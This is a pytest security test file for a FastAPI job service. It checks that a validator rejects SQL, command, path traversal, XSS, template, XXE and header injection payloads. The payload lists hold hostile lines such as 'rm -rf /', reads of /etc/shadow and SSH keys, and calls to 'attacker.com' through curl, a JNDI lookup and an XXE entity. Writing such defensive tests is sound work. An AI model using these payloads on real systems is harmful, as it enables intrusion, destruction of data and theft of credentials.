import pytest
from core.security import SecurityValidator
from fastapi import status
from models import Job
@pytest.mark.security
class TestSQLInjection:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("sql_payload", [
        # Classic SQL Injection
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
        
        "' UNION SELECT NULL, NULL, NULL--",
        "1' UNION SELECT username, password FROM users--",
        
        "'; DROP TABLE jobs; --",
        "1; DELETE FROM jobs WHERE 1=1; --",
        "'; UPDATE jobs SET status='completed'--",
        
        "' AND 1=1--",
        "' AND 'x'='x",
        "1' AND SUBSTRING(@@version,1,1)='5'--",
        
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR SLEEP(5)--",
        
        "admin'/*",
        "/**/OR/**/1=1--",
        
        "' OR 0x31=0x31--",
        "' OR CHAR(49)=CHAR(49)--",
    ])
    def test_sql_injection_payloads_blocked(self, validator, sql_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"input": sql_payload}
        )

        assert is_valid is False
        assert "dangerous" in error.lower() or "pattern" in error.lower()

    def test_sql_injection_in_api_endpoint(self, client, auth_headers):
        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "model": "'; DROP TABLE jobs; --",
                    "n_estimators": 100},
                "priority": 5
            },
            headers = auth_headers
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST

    def test_parameterized_queries_used(self, test_db):
        malicious_user = "'; DROP TABLE jobs; --"

        jobs = test_db.query(Job).filter(Job.user_id == malicious_user).all()
        assert isinstance(jobs, list)

@pytest.mark.security
class TestNoSQLInjection:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("nosql_payload", [
        {"$ne": None},
        {"$gt": ""},
        {"$where": "function() { return true; }"},
        {"$regex": ".*"},
    ])

    def test_no_sql_operators_validated(self, validator, nosql_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"filter": nosql_payload}
        )

        assert isinstance(is_valid, bool)

@pytest.mark.security
class TestCommandInjection:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("command_payload", [
        "__import__('os').system('ls')",
        "exec('import os; os.system(\"cat /etc/passwd\")')",
        "eval('__import__(\"os\").system(\"whoami\")')",
        "compile('malicious', '<string>', 'exec')",
        
        "subprocess.call(['rm', '-rf', '/'])",
        "subprocess.Popen('cat /etc/passwd', shell=True)",
        
        "os.system('curl attacker.com')",
        "os.popen('ls -la')",
        
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        
        "open('/etc/passwd').read()",
        "with open('/etc/shadow') as f: f.read()",
    ])
    def test_command_injection_blocked(self, validator, command_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"code": command_payload}
        )

        assert is_valid is False
        assert "dangerous" in error.lower() or "pattern" in error.lower()

@pytest.mark.security
class TestPathTraversal:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("path_payload", [
        "../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../../root/.ssh/id_rsa",
        
        "..\\..\\..\\windows\\system32\\config\\sam",
        "..\\..\\..\\boot.ini",
        
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5c..%5c..%5cwindows%5csystem32",
        
        "..%252f..%252f..%252fetc%252fpasswd",
        
        "../../../etc/passwd%00",
        
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\sam",
        
        "../../.env",
        "../../../secrets.yaml",
        "../../../../config/database.yml",
    ])

    def test_path_traversal_blocked(self, validator, path_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"field_path": path_payload}
        )

        assert is_valid is False
        assert "dangerous" in error.lower() or "pattern" in error.lower()

    def test_path_traversal_in_config(self, client, auth_headers):
        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "data_file": "../../../etc/passwd",
                    "n_estimators": 100
                },
                "priority": 5
            },
            headers = auth_headers
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST

@pytest.mark.security
class TestXSSInjection:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("xss_payload", [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        
        "<img src=x onerror=alert('XSS')>",
        "<img src='x' onerror='alert(1)'>",
        
        "<body onload=alert('XSS')>",
        "<div onmouseover=alert('XSS')>",
        
        "javascript:alert('XSS')",
        "javascript:alert(document.cookie)",
        
        "<svg/onload=alert('XSS')>",
        "<svg><script>alert('XSS')</script></svg>",
        
        "<iframe src='javascript:alert(1)'>",
        
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        
        "{{7*7}}",
        "${alert('XSS')}",
    ])

    def test_xss_injection_blocked(self, validator, xss_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"description": xss_payload}
        )

        assert is_valid is False

@pytest.mark.security
class TestLDAPInjection:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("ldap_payload", [
        "*",
        "*)(&",
        "*)(objectClass=*",
        "admin)(&(password=*))",
        "*))(|(password=*",
    ])

    def test_ldap_injection_blocked(self, validator, ldap_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"description": ldap_payload}
        )

        assert isinstance(is_valid, bool)

@pytest.mark.security
class TestTemplateInjection:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("template_payload", [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://attacker.com/a}",
        "${jndi:dns://attacker.com/a}",
        
        "${applicationScope}",
        "#{request.getSession()}",
    ])

    def test_template_injection_blocked(self, validator, template_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"description": template_payload}
        )

        assert is_valid is False

@pytest.mark.security
class TestXMLInjection:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("xml_payload", [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        
        '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>',
    ])

    def test_xml_injection_blocked(self, validator, xml_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"description": xml_payload}
        )

        assert is_valid is False

@pytest.mark.security
class TestHeaderInjection:
    def test_crlf_injection_in_headers(self, client):
        malicious_header = "test\r\nX-Injected: malicious"
        response = client.get(
            "/health",
            headers = {
                "X-Custom-Header": malicious_header
            }
        )

        assert "X-Injected" not in response.headers

    def test_response_splitting(self, client, auth_headers):
        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "name": "test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n",
                    "n_estimators": 100},
                "priority": 5
            },
            headers = auth_headers
        )

        assert response.status_code in [status.HTTP_400_BAD_REQUEST, status.HTTP_201_CREATED]

@pytest.mark.security
class TestPolymorphicPayloads:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("evasion_payload", [
        "ExEc('malicious')",
        "EvAl('code')",
        
        "\\u0065\\u0078\\u0065\\u0063",
        
        "ex" + "ec('code')",
        "e" + "v" + "a" + "l",
        
        "e/*comment*/val('code')",
        "ex/**/ec('code')",
    ])

    def test_polymorphic_payloads_blocked(self, validator, evasion_payload):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"description": evasion_payload}
        )

        if not is_valid:
            assert "dangerous" in error.lower() or "pattern" in error.lower()
        assert is_valid is False